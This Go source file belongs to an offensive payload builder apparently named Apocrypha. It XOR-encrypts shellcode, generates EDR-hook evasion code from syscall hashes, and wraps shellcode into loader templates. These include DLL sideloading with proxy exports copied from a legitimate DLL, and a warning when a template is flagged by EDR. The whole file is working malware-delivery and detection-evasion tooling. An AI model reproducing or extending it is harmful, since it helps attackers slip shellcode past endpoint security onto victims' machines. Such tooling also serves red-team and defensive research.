package apocrypha

import (
  "fmt"
  "os"
  "text/template"
  "strings"
  "io/ioutil"
  "gopkg.in/yaml.v2"
  "encoding/hex"
  "strconv"
)
type WrapperStruct struct {
	Shellcode string
	Crypto string
	Filename string
	ExportName string
	SideloadExports string
}
type Custom_for_ASM struct {
	Str_bytes string
	Offset int
}
type EdrWrapperTemplate struct {
	Num int
	Init_objs string
}
type XorPreludeStruct struct {
	SizeOfBuffer string
	Key string
	Filename string
	Function_Name string
	LoaderFuncCall string
}
func TemplateXORPrelude(config YamlConfig) {
	var xor_prelude_template XorPreludeStruct
	key, err := os.ReadFile("./output/encrypt.key")
	  if err != nil {
      panic(err)
    }
	xor_prelude_template.Key = "0x"+hex.EncodeToString(key)
	// Get size of bytes for template here
    fi, err := os.Stat("./output/"+config.OutFilename+".bin")
    if err != nil {
        panic("Couldn't get size of "+config.OutFilename+".bin")
    }
    // get the size
    size := fi.Size()
    xor_prelude_template.SizeOfBuffer = strconv.FormatInt(size, 10)
	fmt.Println("Templating xor_prelude.asm...")
      t, err := template.ParseFiles("./utility_templates/xor_prelude.asm.template")
      if err != nil {
          panic(err)
      }
      f, err := os.Create("./output/"+config.OutFilename+"-xorprelude.asm")
      if err != nil {
        panic(err)
      }
      err = t.Execute(f, xor_prelude_template)
      if err != nil {
          panic(err)
      }
      f.Close()
}

func TemplateEdrHooks(config YamlConfig, input_structs []SyscallStruct) {
	fmt.Println("Templating " + config.ShellcodeOpts.EdrHooks + ".cpp...")
	// Get number of functions
	var edr_wrapper_template EdrWrapperTemplate
	edr_wrapper_template.Num = len(input_structs)
	edr_wrapper_template.Init_objs = ""
	// Build strings for inline object inits
	for _, myobj := range input_structs {
		// i.e. {{djb2namehashbytes, {0xde,0xad,0xco,0xde,0xde,0xad,0xco,0xde}},}
		var djb2_hash_string = TrimFirstChar(TrimLastChar(BuildCStyleByteArrayNoData((myobj.Djb2Name))))
		format_obj := djb2_hash_string+"," + TrimFirstChar(TrimLastChar(BuildCStyleByteArrayNoData(myobj.FunctionBytes)))
		edr_wrapper_template.Init_objs += format_obj + ","
	}
	edr_wrapper_template.Init_objs = TrimLastChar(edr_wrapper_template.Init_objs)
	// Now template it out
	t, err := template.ParseFiles("./utility_templates/"+config.ShellcodeOpts.EdrHooks+"_edr_hooks.cpp.template")
	if err != nil {
		panic(err)
	}
	f, err := os.Create("./output/"+config.ShellcodeOpts.EdrHooks+".cpp")
	if err != nil {
	panic(err)
	}
	err = t.Execute(f, edr_wrapper_template)
	if err != nil {
		panic(err)
	}
	f.Close()
}

func WrapperTemplater(config YamlConfig) map[string]interface{} {
	entries, err := os.ReadDir("./wrappers/")
	if err != nil {
		panic(err)
	}
	var meta_data map[string]interface{}
    for _, e := range entries {
		// This could be run on a Linux system so everything wrappers/* needs to be all lowercase
		
		if config.WrapperOpts.Format == e.Name() {
			fmt.Println("Reading meta.yml for "+config.WrapperOpts.Format+"...")
			// Read YAML meta file into 'data'
			data, meta_err := ioutil.ReadFile("./wrappers/"+config.WrapperOpts.Format+"/meta.yml")
			if meta_err != nil {
				panic(meta_err)
			}
			if err = yaml.Unmarshal(data, &meta_data); err != nil {
				panic(err)
			}
			// Valid type assertions
			if TypeAssertionValidator(meta_data["template_filename"]) != "string" {
				fmt.Println("template_filename is not the proper type. It should be a string")
				os.Exit(1)
			}
			if TypeAssertionValidator(meta_data["language"]) != "string" {
				fmt.Println("language is not the proper type. It should be a string")
				os.Exit(1)
			}
			if TypeAssertionValidator(meta_data["filetype"]) != "string" {
				fmt.Println("filetype is not the proper type. It should be a string")
				os.Exit(1)
			}
			//This will make sure the field exists as well
			if TypeAssertionValidator(meta_data["detected"]) != "bool" {
				fmt.Println("detected is either missing or not the proper type. It should be a boolean")
				os.Exit(1)
			}
			// Validate required string fields are not empty
			if meta_data["template_filename"].(string) == "" || meta_data["language"].(string) == "" || meta_data["filetype"].(string) == "" {
				fmt.Println("YAML file has empty strings in required fields. Please fill them in")
				os.Exit(1)
			}
			//Validate no command injection
			AntiCommandInject([]string{config.OutFilename, meta_data["language"].(string), meta_data["filetype"].(string)})
		}
  }
	if meta_data["template_filename"].(string) == "" {
		fmt.Println("[-] Could not find a matching wrapper for "+config.WrapperOpts.Format + "\n")
		os.Exit(1)
	}
	if meta_data["detected"].(bool) == true {
		fmt.Println("\n***** WARNING *****")
		fmt.Println("[!] "+config.WrapperOpts.Format + " is currently detected by EDR\n" )
	}
	meta_data["filetype"] = strings.ToLower(meta_data["filetype"].(string))
	meta_data["language"] = strings.ToLower(meta_data["language"].(string))

	var wrapper_template_input WrapperStruct
	shellcode, err := os.ReadFile(config.InFile)
    if err != nil {
      panic(err)
    }
	wrapper_template_input.Shellcode = TrimFirstChar(TrimLastChar(BuildCStyleByteArray(shellcode)))
	wrapper_template_input.Filename = config.OutFilename

	// Check if we're defining a custom function export for a dll wrapper
	if (meta_data["filetype"].(string) == "dll") {
		// No yaml field so randomly generate string even if dll wrapper doesn't use it
		if _, exists := meta_data["export_name"]; !exists {
			wrapper_template_input.ExportName = GenerateRandomString(12)
			fmt.Println("If applicable to template, dll will put shellcode in export: "+wrapper_template_input.ExportName+"()...")
		} else if TypeAssertionValidator(meta_data["export_name"]) == "string" && meta_data["export_name"].(string) != ""  {
			// Use provided value
			wrapper_template_input.ExportName = meta_data["export_name"].(string)
			fmt.Println("If applicable to template, dll will put shellcode export: "+wrapper_template_input.ExportName+"()...")
		} else {
			// Wrong type or empty string field i.e. ""
			fmt.Println("[-] export_name is not the proper type or is blank (\"\"). It should be a string. Comment out this field if you would like Apocrypha to randomly generate a string to use if its applicable to the specific wrapper template")
			os.Exit(1)
		}
		// If dll is for a sideload populate other exported functions from input dll
		if (strings.Contains(meta_data["template_filename"].(string), "sideload")) {
			if TypeAssertionValidator(meta_data["input_dll"]) == "string" && meta_data["input_dll"].(string) != "" {
				dllExports, err := ExportsFromFile(meta_data["input_dll"].(string))
				if (err != nil) {
					fmt.Print("Could read exports from dll")
					panic(err)
				}
				//Create string for all other exports and leave out if export_name matches (we are putting the shellcode in that one)
				for _, export := range dllExports {
					if (strings.ToLower(export) == strings.ToLower(meta_data["export_name"].(string))) {
						// Do nothing	
					} else {
						if meta_data["language"].(string) == "go" {
							export_string := "//export " + export + "\n" + "func " + export + "() {\n}"
							wrapper_template_input.SideloadExports += export_string
						} else {
							fmt.Println("[-] Currently only sideload support for dlls written in go")
							os.Exit(1)
						}
					}
				}
			} else {
				fmt.Println("input_dll is not the proper type or is blank (\"\"). It should be a string")
				os.Exit(1)
			}
		}
	}

	fmt.Println("Templating "+meta_data["template_filename"].(string)+"...")
	t, err := template.ParseFiles("./wrappers/"+config.WrapperOpts.Format+"/"+meta_data["template_filename"].(string))
	if err != nil {
		panic(err)
	}
	f, err := os.Create("./output/"+config.OutFilename+"."+meta_data["language"].(string))
	if err != nil {
		panic(err)
	}
	err = t.Execute(f, wrapper_template_input)
	if err != nil {
		panic(err)
	}
	f.Close()
	return meta_data
}